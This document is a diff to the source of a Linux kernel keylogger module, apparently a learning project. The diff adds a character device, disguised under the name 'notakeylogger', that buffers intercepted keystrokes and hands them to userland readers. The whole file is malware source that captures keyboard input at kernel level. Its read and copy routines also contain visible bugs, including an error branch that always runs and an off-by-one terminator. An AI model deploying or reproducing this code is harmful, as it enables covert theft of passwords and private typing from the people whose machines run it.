@@ -8,6 +8,7 @@
 
 // GENERAL //
 #define DEVICE_NAME "My Key Logger"            // Use this macro for logging
+#define CHRDEV_NAME "My Log Device"            // Use this macro to log the character device
 #define BUFF_SIZE 16                           // Size of the out buffer
 #ifndef TRUE
 #define TRUE 1
@@ -35,6 +36,9 @@
 // Placeholder SOLUTION 2
 #endif  // SOLUTION
 
+// CHAR DEVICE //
+#define CDEV_BUFF_SIZE 511
+
 /////////////
 /* HEADERS */
 /////////////
@@ -45,11 +49,14 @@
 
 #include <asm/uaccess.h>                        // get_fs(), set_fs()
 #include "HarkleKerror.h"                       // Kernel error macros
+#include <linux/cdev.h>                         // cdev available
 #include <linux/fcntl.h>                        // filp_open(), filp_close()
 #include <linux/fs.h>                           // Defines file table structures
 #include <linux/kernel.h>                       // ALWAYS NEED
 #include <linux/module.h>                       // ALWAYS NEED
+#include <linux/semaphore.h>                    // semaphores
 #include <linux/stat.h>                         // File mode macros
+#include <linux/uaccess.h>                      // copy_to_user
 
 #if SOLUTION == 1
 #include <linux/interrupt.h>                    // irq_handler_t
@@ -66,6 +73,17 @@ typedef struct _myKeyLogger
     loff_t logOffset;
     unsigned char keyStr[BUFF_SIZE + 1];
 } myKeyLogger, *myKeyLogger_ptr;
+
+typedef struct _myLogDevice
+{
+    char logBuf[CDEV_BUFF_SIZE + 1];
+    size_t bufLength;
+    struct semaphore openSem;                   // No more than one user
+    struct semaphore busySem;                   // One modifcation to the buffer at a time
+    dev_t dev_num;                              // Will hold device number that kernel gives us
+    int major_num;                              // Major number assigned to the device
+    int minor_num;                              // Minor number assigned to the device
+} myLogDevice, *myLogDevice_ptr;
 
 /////////////////////////
 /* FUNCTION PROTOTYPES */
@@ -97,11 +115,25 @@ DECLARE_TASKLET(my_tasklet, tasklet_logger, 0);  // SOLUTION #1 - ISR4IRQ
 // PURPOSE - Respond to a key press notification
 int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_param);
 #endif  // SOLUTION
+// PURPOSE - fops.open for the character device
+// INPUT
+//  inode - reference to the file on disk and contains information about that file
+//  filp - represents an abstract open file
+int device_open(struct inode *inode, struct file *filp);
+ssize_t device_read(struct file* filp, char* bufStoreData, size_t bufCount, loff_t* curOffset);
+// PURPOSE - fops.write for the character device
+// NOTE - Is it bad that I'm defining a do-nothing write function?  Should I just leave fops.write == NULL?
+ssize_t device_write(struct file* filp, const char* bufSourceData, size_t bufCount, loff_t* curOffset);
+int device_close(struct inode *inode, struct file *filp);
+// PURPOSE - Write the contents of srcBuf to dstDev.logBuf with care for buffer overruns
+// OUTPUT - Number of characters printed on success, -1 on failure
+static int write_to_chrdev(myLogDevice_ptr dstDev, char *srcBuf);
 
 /////////////
 /* GLOBALS */
 /////////////
 myKeyLogger myKL;
+myLogDevice myLD;
 int shift;
 #if SOLUTION == 1
 unsigned char sCode;  // SOLUTION #1 - ISR4IRQ
@@ -109,6 +141,17 @@ unsigned char sCode;  // SOLUTION #1 - ISR4IRQ
 // Register this with the keyboard driver
 static struct notifier_block kl_notif_block = { .notifier_call = kl_module };
 #endif  // SOLUTION
+struct cdev *myCdev;            // My character device driver
+// This tells the kernel which functions to call when a user operates on our device file_operations
+struct file_operations fops =
+{
+    .owner = THIS_MODULE,       // Prevent unloading of this module when operations are in use
+    .open = device_open,        // Points to the method to call when opening the device
+    .release = device_close,    // Points to the method to call when closing the device
+    .write = device_write,      // Points to the method to call when writing to the device
+    .read = device_read         // Points to the method to call when reading from the device
+};
+static struct class *cfake_class = NULL;
 
 //////////////////////////
 /* FUNCTION DEFINITIONS */
@@ -119,6 +162,7 @@ static int __init key_logger_init(void)
     // unsigned char i = 0;  // DEBUGGING
     int tempRetVal = 0;  // write_log() return value
     int msgLen = strlen(DEF_LOG_INIT_MSG);  // Length of init message
+    struct device *device = NULL;  // device_create() return value
     
     HARKLE_KINFO(DEVICE_NAME, "Key logger loading");  // DEBUGGING
 
@@ -193,6 +237,105 @@ static int __init key_logger_init(void)
         register_keyboard_notifier(&kl_notif_block);
 #endif  // SOLUTION
     }
+
+    // Setup character device
+    // 1. Prepare the struct
+    if (!retVal)
+    {
+        HARKLE_KINFO(CHRDEV_NAME, "Preparing character device");  // DEBUGGING
+
+        // Initialize the semaphores
+        sema_init(&myLD.openSem, 1);
+        sema_init(&myLD.busySem, 1);
+
+        // Memset the buffer
+        memset(myLD.logBuf, 0x0, CDEV_BUFF_SIZE + 1);
+
+        // Set buf length
+        myLD.bufLength = 0;
+    }
+
+    // 2. Get a major number for our device
+    if (!retVal)
+    {
+        // Use dynamic allocation to assign our device a major number
+        // alloc_chrdev_region(dev_t*, uint fminor, uint count, char* name)
+        retVal = alloc_chrdev_region(&(myLD.dev_num), 0, 1, CHRDEV_NAME);
+        if (retVal < 0)
+        {
+            HARKLE_KERROR(CHRDEV_NAME, key_logger_init, "Failed to allocate a major number for the character device");
+        }
+        else
+        {
+            // printk(KERN_DEBUG "%s: alloc_chrdev_region() returned %d\n", CHRDEV_NAME, retVal);  // DEBUGGING
+            myLD.major_num = MAJOR(myLD.dev_num);
+            myLD.minor_num = MINOR(myLD.dev_num);
+            // printk(KERN_INFO "%s: Major number is %d\n", CHRDEV_NAME, myLD.major_num);  // DEBUGGING
+            // printk(KERN_INFO "%s: Minor number is %d\n", CHRDEV_NAME, myLD.minor_num);  // DEBUGGING
+            retVal = 0;
+        }
+    }
+
+    // 3. Create device class (before allocation of the array of devices)
+    if (!retVal)
+    {
+        cfake_class = class_create(THIS_MODULE, CHRDEV_NAME);
+        if (IS_ERR(cfake_class))
+        {
+            HARKLE_KERROR(CHRDEV_NAME, key_logger_init, "class_create() failed");  // DEBUGGING
+            retVal = PTR_ERR(cfake_class);
+        }
+    }
+
+    // 4. Allocate and initialize the character device structure
+    if (!retVal)
+    {
+        
+        myCdev = cdev_alloc();  // Create our cdev structure
+        // Initialize the cdev structure
+        if (myCdev)
+        {
+            // myCdev->ops = &fops;            // Struct file_operations
+            // myCdev->owner = THIS_MODULE;    // Very common
+
+            cdev_init(myCdev, &fops);
+        }
+        else
+        {
+            HARKLE_KERROR(CHRDEV_NAME, key_logger_init, "Failed to allocate the cdev structure");  // DEBUGGING
+            retVal = -1;
+        }
+    }
+
+    // 5. Add this character device to the system
+    if (!retVal)
+    {
+        retVal = cdev_add(myCdev, myLD.dev_num, 1);
+
+        if (retVal < 0)
+        {
+            printk(KERN_ALERT "myTestDevice: unable to add cdev to kernel\n");
+        }
+        else
+        {
+            // The device is now "live" and can be called by the kernel
+            HARKLE_KFINFO(CHRDEV_NAME, key_logger_init, "Character device is now 'live'");
+        }
+    }
+
+    // 6. Create a device and register it with sysfs 
+    if (!retVal)
+    {
+        // device = device_create(class, NULL, devno, NULL, CFAKE_DEVICE_NAME "%d", minor);
+        device = device_create(cfake_class, NULL, myLD.dev_num, NULL, "notakeylogger" "%d", 1);
+
+        if (IS_ERR(device))
+        {
+            retVal = PTR_ERR(device);
+            HARKLE_KERROR(CHRDEV_NAME, key_logger_init, "device_create() failed");
+            cdev_del(myCdev);
+        }
+    }
     
     // DONE
     HARKLE_KINFO(DEVICE_NAME, "Key logger loaded");  // DEBUGGING
@@ -246,6 +389,23 @@ static void __exit key_logger_exit(void)
         HARKLE_KWARNG(DEVICE_NAME, key_logger_exit, "Logging file pointer was NULL");  // DEBUGGING
     }
     
+    // Teardown the character device
+    HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Destroying device");  // DEBUGGING
+    // device_destroy(class, MKDEV(cfake_major, minor));
+    device_destroy(cfake_class, myLD.dev_num);
+
+    HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Deleting device");  // DEBUGGING
+    // cdev_del(&dev->cdev);
+    cdev_del(myCdev);
+
+    HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Destroying class");  // DEBUGGING
+    // class_destroy(cfake_class);
+    class_destroy(cfake_class);
+
+    HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Unregistering character device");  // DEBUGGING
+    // unregister_chrdev_region(MKDEV(cfake_major, 0), cfake_ndevices);
+    unregister_chrdev_region(myLD.dev_num, 1);
+
     // DONE
     HARKLE_KINFO(DEVICE_NAME, "Key logger unloaded");  // DEBUGGING
     return;
@@ -417,6 +577,16 @@ void tasklet_logger(unsigned long data)
                 HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_log() has failed");  // DEBUGGING
             }
         }
+
+        // 2. Write the string to the character device
+        if (msgLen > 0)
+        {
+            // static int write_to_chrdev(myLogDevice_ptr dstDev, char *srcBuf);
+            if (msgLen != write_to_chrdev(&myLD, myKL.keyStr))
+            {
+                HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_to_chrdev() has failed");  // DEBUGGING
+            }
+        }
     }
     else
     {
@@ -485,6 +655,16 @@ int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_para
                 if (msgLen != write_log(myKL.log_fp, myKL.keyStr, msgLen, myKL.logOffset))
                 {
                     HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_log() has failed");  // DEBUGGING
+                }
+            }
+
+            // 2. Write the string to the character device
+            if (msgLen > 0)
+            {
+                // static int write_to_chrdev(myLogDevice_ptr dstDev, char *srcBuf);
+                if (msgLen != write_to_chrdev(&myLD, myKL.keyStr))
+                {
+                    HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_to_chrdev() has failed");  // DEBUGGING
                 }
             }
         }
@@ -696,6 +876,181 @@ static int translate_code(unsigned char scanCode, char *buf)
     else
     {
         HARKLE_KERROR(DEVICE_NAME, translate_code, "NULL pointer");  // DEBUGGING
+    }
+
+    return retVal;
+}
+
+///////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////// CHARACTER DEVICE FUNCTIONS ///////////////////////////////////
+///////////////////////////////////////////////////////////////////////////////////////////////////
+
+int device_open(struct inode *inode, struct file *filp)
+{
+    int retVal = 0;
+
+    // Only allow one process to open this device by using a semaphore as mutal exclusive lock - mutext
+    retVal = down_interruptible(&myLD.openSem);
+    if (retVal != 0)
+    {
+        printk(KERN_ALERT "%s: Unable to lock device during open\n", CHRDEV_NAME);  // DEBUGGING
+        retVal = -1;
+    }
+    else
+    {
+        HARKLE_KFINFO(CHRDEV_NAME, device_open, "Opened device");  // DEBUGGING
+    }
+
+    return retVal;
+}
+
+ssize_t device_read(struct file* filp, char* bufStoreData, size_t bufCount, loff_t* curOffset)
+{
+    // LOCAL VARIABLES
+    unsigned long tempRetVal = 0;  // Return value from copy_to_user
+    ssize_t retVal = 0;  // Number of bytes read
+    size_t numBytesToRead = 0;  // Smallest between bufCount and myLD.bufOffset
+    int i = 0;  // Index into logBuf
+
+    if (!filp || !bufStoreData || !curOffset)
+    {
+        HARKLE_KERROR(CHRDEV_NAME, device_read, "NULL pointer");  // DEBUGGING
+    }
+    else if (bufCount < 1)
+    {
+        HARKLE_KERROR(CHRDEV_NAME, device_read, "Invalid destination buffer size");  // DEBUGGING
+    }
+    else
+    {
+        HARKLE_KFINFO(CHRDEV_NAME, device_read, "Reading from device");
+
+        if (bufCount < myLD.bufLength)
+        {
+            numBytesToRead = bufCount;
+        }
+        else
+        {
+            numBytesToRead = myLD.bufLength;
+        }
+
+        tempRetVal = copy_to_user(bufStoreData, myLD.logBuf, numBytesToRead);
+
+        // Success
+        if (!tempRetVal)
+        {
+            // Everything was read
+            if (numBytesToRead == myLD.bufLength)
+            {
+                HARKLE_KFINFO(CHRDEV_NAME, device_read, "Total read executed");
+                retVal = numBytesToRead;
+                myLD.logBuf[0] = 0;  // Truncate current contents
+                myLD.bufLength = 0;  // Indicate the buffer is empty
+            }
+            // Partial read
+            else
+            {
+                HARKLE_KFINFO(CHRDEV_NAME, device_read, "Partial read executed");
+                // Save the return value
+                retVal = numBytesToRead;
+                // Move everything to the front
+                while (numBytesToRead < myLD.bufLength)
+                {
+                    myLD.logBuf[i] = myLD.logBuf[numBytesToRead];
+                    i++;
+                    numBytesToRead++;
+                }
+                // Truncate it
+                myLD.logBuf[numBytesToRead] = 0;
+                // Reset the buffer length
+                myLD.bufLength = 0;
+            }
+        }
+        // Error condition
+        {
+            HARKLE_KERROR(CHRDEV_NAME, device_read, "copy_to_user() failed to copy all the bytes");  // DEBUGGING
+            printk(KERN_DEBUG "%s: Failed to copy %lu bytes\n", CHRDEV_NAME, tempRetVal);
+            retVal = numBytesToRead - tempRetVal;  // Return the number of bytes read
+        }
+    }
+    
+    return retVal;
+}
+
+ssize_t device_write(struct file* filp, const char* bufSourceData, size_t bufCount, loff_t* curOffset)
+{
+    HARKLE_KFINFO(CHRDEV_NAME, device_write, "Write operations not implemented for this device.");  // DEBUGGING
+    return bufCount;  // Lip service
+}
+
+int device_close(struct inode *inode, struct file *filp)
+{
+    up(&myLD.openSem);
+    HARKLE_KFINFO(CHRDEV_NAME, device_close, "Closed device");  // DEBUGGING
+    return 0;
+}
+
+static int write_to_chrdev(myLogDevice_ptr dstDev, char *srcBuf)
+{
+    // LOCAL VARIABLES
+    int retVal = 0;
+    size_t srcLen = 0;  // Length of srcBuf
+    size_t dstSpace = 0;  // Remaining space in the destination buffer
+    char *tmp_ptr = NULL;  // Destination address for the copy
+
+    // INPUT VALIDATION
+    if (!dstDev || !srcBuf)
+    {
+        retVal = -1;
+        HARKLE_KERROR(DEVICE_NAME, write_to_chrdev, "NULL pointer");  // DEBUGGING
+    }
+    else if (!(*srcBuf))
+    {
+        retVal = -1;
+        HARKLE_KERROR(DEVICE_NAME, write_to_chrdev, "Empty source buffer");  // DEBUGGING
+    }
+    else
+    {
+        // 0. Lock it
+        retVal = down_interruptible(&myLD.busySem);
+        if (retVal != 0)
+        {
+            printk(KERN_ALERT "%s: Unable to lock device during write_to_chrdev()\n", CHRDEV_NAME);  // DEBUGGING
+            retVal = -1;
+        }
+        else
+        {
+            HARKLE_KFINFO(CHRDEV_NAME, write_to_chrdev, "Device 'busy'");  // DEBUGGING
+
+            // 1. Size the input buffer
+            srcLen = strlen(srcBuf);
+
+            // 2. Determine the remaining space in the destination buffer
+            dstSpace = CDEV_BUFF_SIZE - dstDev->bufLength;
+
+            if (dstSpace >= srcLen)
+            {
+                tmp_ptr = (char*)(dstDev->logBuf + dstDev->bufLength);
+            }
+            else
+            {
+                HARKLE_KWARNG(DEVICE_NAME, write_to_chrdev, "Wrapping the character device buffer.  Data lost.");  // DEBUGGING
+                tmp_ptr = (char*)dstDev->logBuf;
+                dstDev->bufLength = 0;  // We're losing some data
+            }
+
+            if (tmp_ptr != strncpy(tmp_ptr, srcBuf, srcLen))
+            {
+                HARKLE_KERROR(DEVICE_NAME, write_to_chrdev, "strncpy() has failed");
+            }
+            else
+            {
+                *(tmp_ptr + srcLen + 1) = 0;  // Nul terminate it... for safety
+                dstDev->bufLength += srcLen;  // Increase the buffer length
+            }
+
+            // Release the lock
+            up(&myLD.busySem);
+        }
     }
 
     return retVal;
